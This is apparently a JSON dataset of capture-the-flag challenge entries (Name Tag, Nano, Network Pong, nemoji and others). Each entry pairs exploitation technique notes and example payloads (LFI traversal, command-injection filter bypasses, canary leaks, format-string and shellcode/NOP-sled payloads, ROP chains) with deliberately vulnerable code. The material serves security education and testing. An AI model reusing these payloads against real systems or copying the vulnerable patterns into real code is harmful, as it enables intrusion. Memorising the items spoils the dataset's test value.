        "key": "```python\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  \nfrom cryptography.hazmat.primitives import hashes, hmac\n\ndef AES_decrypt(key, enc_data):  \n   # key: aes_key || hmac_key  \n   aes_key = key[:24]  \n   hmac_key = key[24:]  \n   # enc_data: iv || cipher || mac  \n   iv, cipher, mac = enc_data[:16], enc_data[16:-16], enc_data[-16:]\n\n   aes = Cipher(algorithms.AES(aes_key), modes.CBC(iv))  \n   decryptor = aes.decryptor()  \n   data = decryptor.update(cipher) + decryptor.finalize()\n\n   # check padding  \n   print(data)  \n   data = unpad(data)  \n   if not data:  \n       return None, \"padding error\"\n\n   # check hmac  \n   cal_mac = iv + cipher  \n   for _ in range(7777):    # enhanced secure  \n       h = hmac.HMAC(hmac_key, hashes.MD5())  \n       h.update(cal_mac)  \n       cal_mac = h.finalize()  \n   if cal_mac != mac:  \n       return None, \"hmac error\"\n\n   return data, None  \n```"
    },
    {
        "name": "Name Tag",
        "write_up": "dataset/raw/Name Tag.md",
        "type": "pwn",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When performing static and dynamic analysis on a binary challenge, it's crucial to identify binary protections such as stack canaries, NX (Non-Executable stack), PIE (Position Independent Executable), and RELRO (Relocation Read-Only) levels. These protections influence the development of exploit strategies, such as the need for Return-oriented Programming (ROP) due to NX or leveraging static addresses for ROP gadgets because of the absence of PIE. Additionally, attention should be paid to anti-debugging measures such as the binary's use of `ptrace` to prevent debugger attachment, which can be circumvented by patching the binary to change the syscall number of `ptrace` to a no-operation equivalent or by finding and modifying the instructions leading to the syscall.",
            "In challenges involving stack-based vulnerabilities, leaking the stack canary and exploiting buffer overflows can be executed by abusing unprotected `read` or `printf` functions. If an application reads user input into a buffer without properly enforcing its size limit and ends with a vulnerable function call like `printf` without a terminating null byte, it's possible to read past the intended buffer. This behavior can leak memory contents, including the stack canary. By carefully crafting input that includes filling the buffer and partially overwriting the stack canary (forcing a non-zero value to zero if the canary always ends in zero), one can obtain the canary value from the program's output. Subsequent writes can then fully control the stack, allowing for ROP chains or other exploits, provided the inputs are crafted to bypass or correctly spoof the stack canary, preserving program execution integrity.\n\nExample overflow payload to leak the stack canary (assuming first_name buffer is directly before the canary and no null byte is enforced): `\"A\"*40 + \"B\"` where 40 \"A\"s fill the buffer and \"B\" operates as a delimiter for identifying the beginning of leaked contents, enabling the extraction of the canary value for crafting subsequent exploit payloads."
        ],
        "key": "```c\nundefined8 main(void)  \n{  \n char *bio;  \n long in_FS_OFFSET;  \n char last_name [32];  \n char first_name [40];  \n long cookie;  \n  \n cookie = *(long *)(in_FS_OFFSET + 0x28);  \n setup();  \n memset(last_name,0,0x20);  \n memset(first_name,0,0x20);  \n puts(\"\\nWelcome to Bsides Boston!!!!!!!!\\n\");  \n puts(\"In order for your name tag to be created you need to fill out some information.\");  \n printf(\"Can you please tell us your first name? \");  \n readStr(first_name,64);  \n printf(\"\\nWelcome %s\\n\",first_name);  \n puts(\"Can you please tell us a little about yourself?\");  \n printf(\"Bio: \");  \n bio = (char *)malloc(512);  \n readStr(bio,512);  \n printf(\"Great!!!! Here\\'s your name tag id: %d\\n\",bio);  \n printf(\"\\nOh I almost forgot. Can you tell us your last name to finish up the name tag creationprocess? \");  \n readStr(last_name,112);  \n printTag(first_name,last_name,bio,0x20);  \n if (cookie != *(long *)(in_FS_OFFSET + 0x28)) {  \n                   /* WARNING: Subroutine does not return */  \n   __stack_chk_fail();  \n }  \n return 0;  \n}  \n```"
    },
    {
        "name": "Nameless",
        "write_up": "dataset/raw/Nameless.md",
        "type": "crypto",
        "competition": [
            "HexionCTF/2020",
            "https://ctftime.org/event/1014/tasks/"
        ],
        "score": 983,
        "max_score": 998,
        "difficulty": 0.9849699398797596,
        "knowledge": [
            "In challenges using encryption based on the `rand()` function seeded with time or predictable values, one can reverse the encryption if the seed value can be predicted or narrowed down. For example, if the encryption uses the current time as a seed, one could brute-force seed values around the known time frame of encryption to find the correct seed, and thereby decrypt the encrypted data. This method requires knowledge of the encryption algorithm and any part of the original plaintext (such as a known plaintext attack).\n    \n    Sample approach for decryption:\n    - Using the known plaintext (`hexctf` in this case), iterate through possible `time_t` seed values that could have been used to seed `rand()`.\n    - Reverse the encryption process using each seed to generate the decryption key.\n    - Match the output against the known plaintext to find the correct seed.",
            "When handling binaries that are stripped of symbols and debug information, determining the functionality of parts of the binary relies on recognizing patterns of interaction with known library calls or system functions. In static binaries where functions like `fgets`, `fputc`, and `rand` are used without their symbolic names, identifying these functions can be achieved by analyzing the parameters and behavior in the decompiled or disassembled code and mapping these to known functions from the standard `libc`. This approach facilitates understanding complex binaries and deducing their logic for reverse engineering tasks.\n\n    No specific sample payload is necessary for this point, as it describes a methodology for reverse engineering rather than a direct solution or exploit code."
        ],
        "key": "```c\nint main(void)  \n{  \n time_t curr_time = time(NULL);  \n srand(curr_time);  \n  \n int c = 0;  \n FILE * flag_file = fopen64(\"flag.txt\", \"r\");  \n for ( FILE * out_file = fopen64(\"out.txt\", \"w\"); ; fputc(c, out_file) )  \n {  \n   char flag_char = fgetc(flag_file);  \n   if ( flag_char == -1 )  \n     break;  \n   c = ((signed int)rand() % 0x666 + 1) ^ flag_char;  \n }\n\n fclose(flag_file);  \n fclose(out_file);  \n return 0;  \n}  \n```"
    },
    {
        "name": "Nano",
        "write_up": "dataset/raw/Nano.md",
        "type": "web",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 489,
        "max_score": 500,
        "difficulty": 0.978,
        "knowledge": [
            "When facing a Local File Inclusion (LFI) challenge where the script includes a file based on a GET request parameter without sufficient input validation, you can access arbitrary files on the server, especially when dealing with scripts that handle file operations (open/close). If the script opens a file before the inclusion occurs, you can attempt to include and read files via file descriptors located in `/dev/fd/` by bruteforcing or guessing the file descriptor number. This method is particularly useful when direct access to files is restricted or not directly possible.  \nExample payload: `?flag_help=../../../../../dev/fd/10`",
            "In challenges involving file uploads, when the application does not validate or improperly validates the content of ZIP archives, you can exploit this by creating a ZIP archive containing symlinks to target directories or files on the server. This allows for arbitrary file access or directory traversal attacks if the application extracts the ZIP's contents to a publicly accessible directory. This technique can bypass restrictions on direct file uploads or direct file access.  \nExample payload ZIP creation command: `ln -s /target/file/or/directory symlink_name && zip --symlinks exploit.zip symlink_name`"
        ],
        "key": "```php\n<?php\n    $fp = fopen(\"/etc/tmuctf/another_flag_help.txt\", \"r\");\n    if($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['flag_help']) && strlen($_GET['flag_help']) <= 10) {\n        include($_GET['flag_help']);\n    }\n    fclose($fp);\n    echo highlight_file(__FILE__, true);\n?>\n```"
    },
    {
        "name": "nanovm",
        "write_up": "dataset/raw/nanovm.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 350,
        "max_score": 400,
        "difficulty": 0.875,
        "knowledge": [
            "In challenges involving nested binaries, with one binary containing another for a different architecture, it's essential to analyze the host binary to understand its interaction with the nested binary. This often involves identifying specific functions the host binary uses to communicate or manipulate the nested binary, such as sending APDU commands in the described scenario. This knowledge is vital for understanding the overall functionality and for identifying potential points of interaction or vulnerability.",
            "When faced with a cryptographic challenge implementing CBC mode encryption without direct access to a decryptor, reverse engineering and modifying the binary's logic to switch from encryption to decryption mode can be a successful strategy. This might involve identifying and altering specific instructions within the binary (e.g., changing an \"xor\" instruction that zeroes out a register to a \"nop\" instruction to maintain a register's value) to manipulate the program's flow or data processing behavior, effectively turning an encryption routine into a decryption one without needing to decrypt explicitly. This approach requires a detailed analysis of the binary's operation, particularly the cryptographic routine's implementation details. \n\n   Sample modification to switch modes: Replace the instruction setting a variable to zero (effectively an encrypt mode indicator) with a NOP instruction to retain a nonzero value, thereby switching to decrypt mode (assuming such a mode exists as implied by the binary's logic). The key here is understanding the binary's internal logic and finding a way to invert or bypass the encryption process."
        ],
        "key": "```c\nunsigned short send_apdu(hid_device* device, unsigned char ins, unsigned char p1, const unsigned char* input, unsigned char inputlen, unsigned char** output_ptr, unsigned short* output_len) {\n    unsigned char buffer[256];\n    buffer[0] = 0xE0;\n    buffer[1] = ins;\n    buffer[2] = p1;\n    buffer[3] = 0; // Placeholder for length\n    memcpy(buffer + 5, input, inputlen);\n    buffer[4] = inputlen;\n\n    if (device) {\n        hid_write(device, buffer, inputlen + 5);\n        hid_read(device, buffer, sizeof(buffer));\n    } else {\n        // TCP connection to 127.0.0.1:9999\n        int sock = socket(AF_INET, SOCK_STREAM, 0);\n        struct sockaddr_in server;\n        server.sin_family = AF_INET;\n        server.sin_port = htons(9999);\n        server.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n        connect(sock, (struct sockaddr*)&server, sizeof(server));\n        send(sock, buffer, inputlen + 5, 0);\n        recv(sock, buffer, sizeof(buffer), 0);\n        close(sock);\n    }\n\n    *output_len = buffer[1] << 8 | buffer[2];\n    *output_ptr = malloc(*output_len);\n    memcpy(*output_ptr, buffer + 3, *output_len);\n\n    return buffer[0] << 8 | buffer[1];\n}\n```"
    },
    {
        "name": "Naughty",
        "write_up": "dataset/raw/Naughty.md",
        "type": "pwn",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In format string vulnerabilities where direct exploitation (such as leaking libc addresses or overwriting GOT entries) is initially not feasible due to application structure or security protections, indirect methods can be utilized. One technique involves overwriting pointers or hooks that are executed upon application exit or error handling (for example, entries in the .fini_array section or error functions like `__stack_chk_fail`). This allows for the redirection of the program's execution flow to a desired function, such as `main`, enabling repeated exploitation attempts or further manipulation of the program's state. This strategy requires the program to lack PIE protection, making specific memory addresses predictable.\n   \n   Example payload for overwriting .fini_array to rerun main: `fmtstr_payload(offset, {fini_array_address: address_of_main})`.",
            "When dealing with remote exploitation challenges, especially when targeting functions like `system` to execute arbitrary commands, it's critical to accurately determine the version and base address of the libc being used remotely. This often involves leaking addresses of known libc functions or objects (e.g., `_IO_2_1_stdin_`) and using tools or databases to identify the specific libc version. Once identified, this information can be leveraged to calculate offsets to other libc functions (such as `system`) within the same remote environment. The accurate libc base address is crucial for crafting payloads that dynamically calculate the addresses of libc functions in memory.\n   \n   Sample payload segment for libc leak and system address calculation: \n   ```\n   leak = int(recv_until_marker, 16)\n   libc_base = leak - libc.symbols['_IO_2_1_stdin_']\n   system_address = libc_base + libc.symbols['system']\n   ```"
        ],
        "key": "```c\nint __cdecl main(int argc, const char **argv, const char **envp)  \n{  \n char s; // [esp+0h] [ebp-10Ch]  \n unsigned int v5; // [esp+100h] [ebp-Ch]  \n int *v6; // [esp+104h] [ebp-8h]\n\n v6 = &arg;;  \n v5 = __readgsdword(0x14u);  \n puts(  \n   \"  _  _                     __ _   _        _       _  _\n_  _      _                      ___   \");  \n puts(  \n   \" | \\\\| |   __ _    _  _    / _` | | |_     | |_    | || |    o O O   ___      _ _     o O O | \\\\| |    (_)     __   \"  \n   \"   ___    |__ \\\\  \");  \n puts(  \n   \" | .` |  / _` |  | +| |   \\\\__, | | ' \\\\    |  _|    \\\\_, |   o       / _ \\\\    | '_|   o      | .` |    | |    / _|\"  \n   \"    / -_)     /_/  \");  \n puts(  \n   \" |_|\\\\_|  \\\\__,_|   \\\\_,_|   |___/  |_||_|   _\\\\__|   _|__/   TS__[O]\n\\\\___/   _|_|_   TS__[O] |_|\\\\_|   _|_|_   \\\\\"  \n   \"__|_   \\\\___|   _(_)_  \");  \n puts(  \n\"_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\\\"\\\"\\\"\\\"|_|\n\\\"\\\"\\\"\\\"| {======|_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\"  \n   \"\\\"\\\"\\\"\\\"|\n{======|_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\\\"\\\"\\\"\\\"|_|\\\"\\\"\\\"\\\"\\\"| \");  \n puts(  \n   \"\\\"`-0-0-'\\\"`-0-0-'\\\"`-0-0-'\\\"`-0-0-'\\\"`-0-0-'\\\"`-0-0-'\\\"`-0-0-'./o--\n000'\\\"`-0-0-'\\\"`-0-0-'./o--000'\\\"`-0-0-'\\\"`-0-0-\"  \n   \"'\\\"`-0-0-'\\\"`-0-0-'\\\"`-0-0-' \");  \n puts(\"What is your name?\");  \n fflush(stdout);  \n fgets(&s, 256, stdin);  \n printf(\"You are on the NAUGHTY LIST \");  \n printf(&s);  \n return 0;  \n}  \n```"
    },
    {
        "name": "nDLP",
        "write_up": "dataset/raw/nDLP.md",
        "type": "crypto",
        "competition": [
            "ASIS/2021/Finals",
            "https://ctftime.org/event/1416/tasks/"
        ],
        "score": 218,
        "max_score": 953,
        "difficulty": 0.22875131164742918,
        "knowledge": [
            "When faced with a discrete logarithm problem where the modulus `n` is composite and not prime, solving it directly can be challenging. In such cases, one approach is to use factorization to find the prime factors of `n`. After factorization, one can solve the discrete logarithm problem for each prime factor separately and then apply the Chinese Remainder Theorem to find the original discrete logarithm. This is a theoretical approach which may not be feasible for large numbers or in practical CTF scenarios due to computational constraints.",
            "A more practical approach to solving discrete logarithm problems, especially when `n` is composite, is to use specialized online tools like Alpertron which can handle composite numbers directly. For using Alpertron to solve a discrete logarithm problem, input `g` as `Base`, `y` as `Power`, and `n` as `Modulus` in the tool's interface. This approach is effective for CTF challenges because it bypasses the need for computational resources and deep mathematical understanding of discrete logarithms or the Chinese Remainder Theorem. \n   \n   Example input for Alpertron:\n   - Base (`g`): 685780528648223163108441\n   - Power (`y`): 9136134187598897896238293762558529068838567704462064643828064439262538588237880419716728404254970025\n   - Modulus (`n`): 12588567055208488159342105634949357220607702491616160304212767442540158416811459761519218454720193189"
        ],
        "key": "```python\nx = bytes_to_long(flag)  \ng = 685780528648223163108441  \nn = 12588567055208488159342105634949357220607702491616160304212767442540158416811459761519218454720193189  \ny = pow(g, x, n)  \ny = 9136134187598897896238293762558529068838567704462064643828064439262538588237880419716728404254970025  \n```"
    },
    {
        "name": "nemoji",
        "write_up": "dataset/raw/nemoji.md",
        "type": "pwn",
        "competition": [
            "HXP/2020",
            "https://ctftime.org/event/1134/tasks/"
        ],
        "score": 455,
        "max_score": 1000,
        "difficulty": 0.455,
        "knowledge": [
            "In challenges where you have very constrained code execution space and need to execute arbitrary shellcode, leveraging Return-Oriented Programming (ROP) gadgets within the program or the payload itself can be a viable strategy. Specifically, if the executable space (including NOP slides) and control over certain registers are given, constructing a payload that manipulates the instruction pointer to execute a sequence leading to your shellcode is effective. Utilizing instructions like `call qword ptr [reg + offset]` can redirect execution flow when combined with controlled data segments. The conditions include having control over a register like RAX to point to an executable address crafted or influenced by the attacker.",
            "When a binary involves randomized memory mapping (mmap) which affects where shellcode or critical data can be placed, and the randomness or pattern can be influenced or predicted, performing a bruteforce attack to hit a specific memory address can be instrumental in gaining code execution. This technique relies on the ability to repeatedly attempt memory mappings until obtaining an address that suits the exploitation strategy, such as mapping the shellcode to an address that will be called due to the manipulated execution flow. This strategy requires the attacker to have the ability to invoke the mmap() call multiple times without crashing the program or losing control, and effectively means predicting or influencing where the memory mapping will occur.\n\nSample Payload Construction Approach:\n- Attempt to mmap a specific address conducive to the attack (e.g., 0x6F3E4000).\n- Construct payload segments around expected memory layouts and executable segments, incorporating NOP sleds if necessary to align the shellcode.\n- Utilize adjusted registers and offsets to navigate the execution flow towards the shellcode or ROP gadgets.\n\n```python\n# Example of mmap bruteforce and payload setup\nwhile True:\n    mmap = beer()  # Attempt to get a specific mmap address\n    if mmap == 0x6F3E4000:  # Target address achieved\n        break\n\n# Crafting the payload\npayload = asm(shellcraft.amd64.sh(),arch='amd64')  # Shellcode segment\npayload += b'\\x90' * (512 - len(payload))  # NOP sled to align with executable segment\npayload += b'\\x67\\xFF'  # Instruction to manipulate control flow\npayload += b'\\x90' * (3967 - len(payload))  # Additional padding to reach specified address\npayload += b'\\x00\\x40\\x3E\\x6F\\x00\\x00\\x00\\x00'  # Address to redirect execution to\npayload += b'\\x90' * (4096 - len(payload))  # Final payload size adjustment\n```\nThis approach involves constructing a payload that exploits the control flow manipulation technique and the specific memory mapping to execute arbitrary code effectively."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <unistd.h>\n\n#define PAGE_SIZE 0x1000\n\nchar *rwx_page = NULL;\n\nvoid beer() {\n    unsigned long rand_addr = (rand() << 12);\n    rwx_page = mmap((void *)rand_addr, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);\n    printf(\"Allocated RWX page at: %p\\n\", rwx_page);\n}\n\nvoid horse() {\n    char buffer[PAGE_SIZE];\n    read(0, buffer, PAGE_SIZE);\n\n    // Overwrite parts of buffer with 'A'\n    memset(buffer + 0x100, 'A', 0x100);\n    memset(buffer + 0x23E, 'A', 0xC2);\n\n    // Copy user-controlled parts to RWX page\n    memcpy(rwx_page, buffer, PAGE_SIZE);\n\n    // Execute shellcode at 0x400\n    void (*shellcode)() = (void (*)())(rwx_page + 0x400);\n    shellcode();\n}\n\nint main() {\n    char choice;\n    while (1) {\n        printf(\"(b)eer or (h)orse?\\n\");\n        choice = getchar();\n        getchar(); // consume newline\n        if (choice == 'b') {\n            beer();\n        } else if (choice == 'h') {\n            horse();\n        } else {\n            printf(\"Invalid choice\\n\");\n        }\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Network Pong",
        "write_up": "dataset/raw/Network Pong.md",
        "type": "web",
        "competition": [
            "Sunshine/2022",
            "https://ctftime.org/event/1629/tasks/"
        ],
        "score": 100,
        "max_score": 150,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "When facing shell command injection vulnerabilities in an environment where space characters trigger an error, it is possible to inject commands using the format `}{command;{`. This technique circumvents restrictions that prevent the direct use of spaces in injected commands. Example payload: `google.com};ls;{`",
            "If specific commands or keywords are filtered out by a blacklist (e.g., the word \"cat\" is not allowed), escaping the characters of the blocked command may bypass this filter. This tactic involves adding a backslash (`\\`) before each character in the command to neutralize the filter's effect. Example payload: `google.com};{c\\at,flag.txt`"
        ],
        "key": "```python\nimport subprocess\n\ndef ping_website(website):\n    command = f\"ping -c 1 {website}\"\n    result = subprocess.run(command, shell=True, capture_output=True, text=True)\n    return result.stdout\n\nwebsite = input(\"Enter the IP or domain: \")\nprint(ping_website(website))\n```"
    },
    {
        "name": "NeutronMail",
        "write_up": "dataset/raw/NeutronMail.md",
        "type": "crypto",
        "competition": [
            "LakeCTF/2022",
            "https://ctftime.org/event/1728/tasks/"
        ],
        "score": 416,
        "max_score": 488,
        "difficulty": 0.8524590163934426,
        "knowledge": [
            "When dealing with encrypted messages in CTF challenges, specifically using RSA encryption, if direct factorization of the public modulus fails, a useful strategy might involve finding related keys with insufficient entropy during generation. Comparing the public modulus of these related keys using the Greatest Common Divisor (GCD) method can reveal a nontrivial factor leading to the discovery of private key components (`p`, `q`, `d`, `u`). This approach relies on the chance that related keys were generated with overlapping prime numbers due to insufficient randomness.",
            "In CTF challenges involving decryption with patched or custom tools, when you have a mismatch between the expected signature of the encrypted message and the signature generated by your decryption attempt, it's essential to manually adjust the signature in the decryption tool based on the encrypted message's signature. This may involve modifying the decryption library to accept the extracted signature from the encrypted message, ensuring the successful decryption of the message using the reconstructed private key. This process requires knowledge of the encryption algorithm's internals and how the tool implements its functionality. \n\n   Sample of manual patch in pseudo-code (based on above context, not directly executable):\n   ```python\n   # Assuming pgpy.PGPKey is the class handling the key operation\n   def patch_pgpy_with_priv_numbers(p, q, d, u):\n       # Generate a new PGP key based on RSA Encrypt or Sign with specified modulus size (e.g., 4096 bits)\n       # and replace its components with the factored `p`, `q`, `d`, and `u`\n       new_key = pgpy.PGPKey.new(PubKeyAlgorithm.RSAEncryptOrSign, 4096)\n       new_key._key.p = p\n       new_key._key.q = q\n       new_key._key.d = d\n       new_key._key.u = u\n       return new_key\n   \n   # Patch the library to use a specific signature for the newly generated key\n   def patch_signature(key, signature):\n       # Directly set the signature attribute of the key to match the expected one\n       key.signature = signature\n   ```"
        ],
        "key": "```python\n# This is a possible vulnerable code snippet based on the context of the write-up.\n# The vulnerability lies in the insufficient entropy during key generation, leading to shared factors.\n\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.number import GCD\n\n# Simulate the generation of two RSA keys with insufficient entropy\nkey1 = RSA.generate(4096, e=65537)\nkey2 = RSA.generate(4096, e=65537)\n\n# Extract the public moduli\nn1 = key1.n\nn2 = key2.n\n\n# Calculate the GCD of the two moduli\ngcd = GCD(n1, n2)\n\n# If gcd is greater than 1, it means the keys share a common factor\nif gcd > 1:\n    print(f\"Vulnerable! Shared factor found: {gcd}\")\nelse:\n    print(\"Keys are secure.\")\n```\n"
    },
    {
        "name": "newphonewhodis",
        "write_up": "dataset/raw/newphonewhodis.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 451,
        "max_score": 500,
        "difficulty": 0.902,
        "knowledge": [
            "When exploiting a binary by sending crafted payloads over a limited interaction interface, such as SMS in a GSM network, consider protocol features like multi-part messages to construct the necessary payload for buffer overflow or similar vulnerabilities. Specifically, use the User Data Header (UDH) of concatenated SMS to control message segmentation and sequence, which can be exploited to write outside the intended buffer. This technique is particularly useful in cases where direct interaction with the vulnerable application is not possible, but indirect interaction (such as over SMS or other protocol-based communication) can be used to trigger the vulnerability.\n\nExample payload structure (simplified):\n```python\ndef encode_part(ref_num, data, CSMS=0x17, max_part=3):\n    header = \"\\x05\\x00\\x03\" + chr(CSMS) + chr(max_part) + chr(ref_num)\n    return header + data\n\npayload_data = \"crafted_binary_data_here\"\nsms_payload = encode_part(1, payload_data, CSMS=0x01, max_part=3)  # Example for part 1 of 3\n```",
            "In scenarios where direct memory manipulation is needed to exploit a vulnerability, but standard exploitation tactics (like a second-stage payload delivery via network interaction) are not viable, consider using a Return-Oriented Programming (ROP) chain to manipulate memory directly such as invoking `mmap` to allocate executable memory space and then writing shellcode into that space. This method requires finding suitable gadgets within the binary or loaded libraries, constructing a chain that sequences these gadgets to perform desired memory operations, and finally executing arbitrary code.\n\nExample ROP chain construct (simplified):\n```python\n# Assuming gadgets and addresses are already determined\nrop_chain = [\n    p32(gadget_pop_r4_pc),  # Gadget to control r4 register\n    p32(shellcode_address),  # Address where the shellcode will be written\n    p32(gadget_write_r4_to_r3_address),  # Gadget for writing data from r4 to [r3]\n    # Repeat as needed to construct the full payload in memory\n    p32(jump_to_shellcode_address)  # After writing, jump to the shellcode's address\n]\n```\nThis strategy is often used when exploiting binaries on systems with protections like ASLR and NX, but where a direct second stage payload delivery is not straightforward due to the exploitation environment constraints (e.g., no direct network interaction with the target application)."
        ],
        "key": "```c\n           {  \n             if ( !v55 || v55 > 3 )  \n               puts(\"Unknown data coding scheme in sms. Copying raw data after UDH\");  \n             puts(\"8 bit encoding\");  \n             v49 = 134;  \n             v50 = *(v47->data + 28);  \n             if ( v50 <= 0x8C )  \n               v49 = v50 - 6;  \n             memcpy(&payload[134 * seqnum - 134], (v47->data + 35), v49);  \n           }\n```"
    },
    {
        "name": "NewPwd",
        "write_up": "dataset/raw/NewPwd.md",
        "type": "web",
        "competition": [
            "watevrCTF/2019",
            "https://ctftime.org/event/893/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing a challenge that involves brute-forcing a login page protected by captchas, examine the session cookie for any values that might hint at bypassing or simplifying the captcha mechanism. For instance, if the session cookie includes values that differentiate captcha types, exploit this by collecting multiple instances of each type to analyze and identify common noise and patterns. This can lead to the development of a method to systematically remove or bypass the captcha, significantly reducing the complexity of brute-forcing the password. This approach is particularly useful in scenarios where captchas are the main barrier to automated login attempts.",
            "In captcha-solving challenges where each character within a captcha is significantly distorted in a consistent manner (translated and rotated), divide the captcha into equal parts based on the number of characters and compare these against a database of manually labeled, cleanly extracted characters. The comparison should focus on identifying the closest match by counting the disparities in expected versus actual pixel coloration, particularly looking for areas where a clear image has a black pixel but the captcha character does not. This methodology is applicable in scenarios where captchas are designed with a consistent distortion pattern for each character, allowing for a high accuracy rate in automated captcha solving through pattern recognition and pixel analysis."
        ],
        "key": "```python\ndef login(username, password):\n    if username == \"admin\":\n        if password == \"keep going\" + generate_random_password():\n            return \"Welcome, admin!\"\n        else:\n            return \"Incorrect password. Hint: Character X is wrong.\"\n    else:\n        return \"Invalid username.\"\n\ndef generate_random_password():\n    import random\n    import string\n    return ''.join(random.choices(string.printable, k=64))\n```"
    },
    {
        "name": "NFT Marketplace",
        "write_up": "dataset/raw/NFT Marketplace.md",
        "type": "crypto",
        "competition": [
            "Balsn/2022",
            "https://ctftime.org/event/1697/tasks/"
        ],
        "score": 358,
        "max_score": 381,
        "difficulty": 0.9396325459317585,
        "knowledge": [
            "When interacting with smart contracts in a CTF challenge involving an NFT marketplace, it is possible to precompute contract addresses before they are deployed if their creation code, nonce, and deploying address are known. This allows for the prediction of contract addresses and the possibility to interact with them before their actual deployment on the blockchain. This technique takes advantage of the deterministic nature of contract address generation in Ethereum, which relies on the address that is deploying the contract and the nonce (the number of transactions sent from that address).\n\n    - To precompute a contract address, you can use the formula involving the sender's address (deployer), nonce, and the bytecode of the contract being deployed. This can be achieved through the use of the `keccak256` hashing function on the concatenation of bytecode and specific inputs:\n    ```solidity\n    bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), _target, keccak256(\"UniqueIdentifier\"), keccak256(getBytecode(_target))));\n    return address(uint160(uint(hash)));\n    ```",
            "In a DeFi/ERC20/ERC721-related CTF challenge, if the functionality to create orders or transactions before the initialization of a marketplace or financial contract is not properly restricted, it can be exploited by crafting orders or transactions against expected future states of the contract. This allows for manipulation or theft of tokens (NMTokens in this scenario) or assets (like NFTs) by taking advantage of the uninitialized state of the contract.\n\n    - Before the contract is initialized, create orders for transferring assets (NMTokens or NFTs) that you do not own yet or for currently nonexistent tokens with the assumption that these assets will exist post-initialization. This relies on the logic flaw where checks on ownership or existence are ineffective or bypassed due to the contract's uninitialized state. After the contract initializes and the assets come into existence, these pre-made orders can be fulfilled, allowing for an unauthorized acquisition of assets.\n    ```solidity\n    // Pre-initialization phase: Crafting orders for future assets\n    marketplace.createOrder(nmtoken_addr, 1000000, 0);  // Steal NMTokens\n    marketplace.createOrder(rarenft_addr, 1, 0);        // Steal NFT id 1\n    marketplace.createOrder(rarenft_addr, 2, 0);        // Steal NFT id 2\n    marketplace.createOrder(rarenft_addr, 3, 0);        // Steal NFT id 3\n\n    // Post-initialization phase: Fulfilling the crafted orders\n    marketplace.initialize();\n    marketplace.fulfill(0);\n    marketplace.fulfill(1);\n    marketplace.fulfill(2);\n    marketplace.fulfill(3);\n    ```"
        ],
        "key": "```solidity\nfunction _safeTransferFrom(  \n    address token,  \n    address from,  \n    address to,  \n    uint256 tokenId  \n) internal {  \n    bool success;  \n    bytes memory data;\n\n    assembly {  \n        // we'll write our calldata to this slot below, but restore it later  \n        let memPointer := mload(0x40)  \n        // write the abi-encoded calldata into memory, beginning with the function selector  \n        mstore(0, 0x23b872dd00000000000000000000000000000000000000000000000000000000)  \n        mstore(4, from) // append the 'from' argument  \n        mstore(36, to) // append the 'to' argument  \n        mstore(68, tokenId) // append the 'tokenId' argument\n\n        success := and(  \n            // set success to whether the call reverted, if not we check it either  \n            // returned exactly 1 (can't just be non-zero data), or had no return data  \n            or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),  \n            // we use 100 because that's the total length of our calldata (4 + 32 * 3)  \n            // - counterintuitively, this call() must be positioned after the or() in the  \n            // surrounding and() because and() evaluates its arguments from right to left  \n            call(gas(), token, 0, 0, 100, 0, 32)  \n        )  \n        data := returndatasize()\n\n        mstore(0x60, 0) // restore the zero slot to zero  \n        mstore(0x40, memPointer) // restore the memPointer  \n    }  \n    if (!success) revert TransferFromFailed();  \n}\n```"
    },
    {
        "name": "nibelung",
        "write_up": "dataset/raw/nibelung.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 525,
        "max_score": 755,
        "difficulty": 0.695364238410596,
        "knowledge": [
            "When facing encryption schemes that rely on algebraic structures, identifying the correct structure (Group, Ring, Field) can lead to insights on potential vulnerabilities. In this challenge, recognizing the structure as a Ring instead of a Group reveals that both addition and multiplication operations are defined and can be exploited. This identification is crucial for strategizing attacks, especially in scenarios where the encryption seems homomorphic, allowing operations to happen on encrypted data similar to how they would on plaintext. This knowledge is universally applicable for challenges where the underlying algebraic structure can be exploited for attacks.",
